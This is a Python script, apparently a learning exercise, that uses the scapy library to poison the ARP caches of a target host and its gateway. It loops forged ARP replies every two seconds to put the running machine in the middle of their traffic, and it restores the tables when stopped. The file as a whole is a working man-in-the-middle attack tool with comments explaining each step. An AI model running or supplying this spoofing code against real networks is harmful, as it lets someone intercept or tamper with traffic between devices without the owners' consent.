import scapy.all as scapy
import time
import sys

def get_mac(ip):
    # This will allow us to create an ARP reqest ( who is x.x.x.x)
    arp_request= scapy.ARP(pdst=ip)

    # This section is creating a Ethernet frame that we can send
    # over the network. We are setting the destination mac in the
    # field.
    broadcast= scapy.Ether(dst= 'ff:ff:ff:ff:ff:ff')

    # This section will combine arp request with out Ethernet frame
    arp_request_broadcast= broadcast/arp_request

    # This nex section will allow us to send our ethernet frame
    answered_list= scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    #
    return (answered_list[0][1].hwsrc)


# First field I am going to set is the op field.
# Set to 1 by default which mean when you create
# an arp packet you will create an arpp request.
# We will set it to 2 which will change it to a
# response.
def spoof(target_ip, spoof_ip):
    target_mac= get_mac(target_ip)
    packet= scapy.ARP(op=2, pdst= target_ip, hwdst= target_mac, psrc= spoof_ip)
    scapy.send(packet, verbose= False)


def restore(destination_ip, source_ip):
    destination_mac= get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet= scapy.ARP(op=2, pdst= destination_ip, hwdst= destination_mac,
                      psrc= source_ip, hwsrc= source_mac)
    scapy.send(packet, count=4, verbose= False)
if __name__ == "__main__":
    target_ip= "10.0.2.15"
    gateway_ip= "10.0.2.1"
    sent_packet_count=0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packet_count += 2
            # The comma at the end tells python to print
            # everything on one line but only when the
            # program ends or has been stopped. This is
            # because python is storing it in a buffer.
            # This also telling python to print without
            # the \n character. 2.7 only
            # print("\rPacket Sent: "+ str(sent_packet_count)),

            # Python 3 version of commented statement above and below
            print("\rPacket Sent: " + str(sent_packet_count),end="")

            # This statement tells python to flush the buffer
            # and only print out the last statement on the
            # screen or as output for python 2.7
            # sys.stdout.flush()
            time.sleep(2)
    except (KeyboardInterrupt):
        print("\nUser Manually Stopped Program with CTRL+c. Restoring arp tables of targeted devices")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
